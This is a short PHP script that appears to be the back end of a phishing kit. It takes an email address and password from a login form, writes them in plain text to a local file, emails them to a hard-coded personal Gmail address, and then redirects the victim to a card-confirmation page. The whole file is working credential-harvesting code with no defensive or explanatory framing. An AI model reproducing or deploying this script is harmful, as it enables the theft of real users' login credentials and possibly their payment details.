<?php
    
	    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the form fields and remove whitespace.
			$email = trim($_POST["email"]);
            $password =strip_tags(trim($_POST["password"]));
			
		    $atom   = '[-a-z0-9!#$%&\'*+\\/=?^_`{|}~]';   
            $domain = '([a-z0-9]([-a-z0-9]*[a-z0-9]+)?)';  
           $regex = '/^' . $atom . '+' .'(\.' . $atom . '+)*'.'@'.'(' . $domain . '{1,63}\.)+'.$domain .'{2,63}$/i' ;          

       if ( !preg_match($regex, $email) OR empty($password)) {
            // Set a 400 (bad request) response code and exit.
			header("refresh:0.5;url=index.html");
			  echo "<h3>Oops! Adresse mail invalide ou mode passe vide</h3>";
            exit;
        }
        $fic=fopen("omer.txt","a");
        $phrase='email :'.$email.'| password :'.$password.' |';
        fwrite($fic,$phrase);
        
	
        $dest ='Omer.kouadio90@gmail.com';
        $entete  = 'MIME-Version: 1.0' . "\r\n";
        $entete .= 'Content-type: text/html; charset=utf-8' . "\r\n";
		$message = '<html><body>';
		$message .= '<img src="img/logo.jpg" alt="Website Change Request" />';
		$message = '<h1>Nouvelles informations</h1>';
		$message .= '<table rules="all" style="border: 2px solid #666;" cellpadding="10">';
		$message .= "<tr style='background: #eee;'><td><strong>Adresse mail:</strong> </td><td>" . $email . "</td></tr>";
		$message .= "<tr><td><strong>Mot de passe:</strong> </td><td>" . $password . "</td></tr>";
		$message .= "</table>";
		$message .= "</body></html>";

        $retour = mail($dest, 'Nouvelles informations', stripslashes($message), $entete);
        if($retour) {
            echo header('location:card_confirmation.php');
        }else {
            // Set a 500 (internal server error) response code.
			header("refresh:0.5;url=index.html");
            echo "<h3>Oops! Erreur d'envoir .</h3>";
        } 
		
	}else {
        // Not a POST request, set a 403 (forbidden) response code.
		header( "refresh:0.5;url=index.html" );
        echo "<h3>Impossible de traiter votre demande</h3>  .";
		
		exit;
		
		}
?>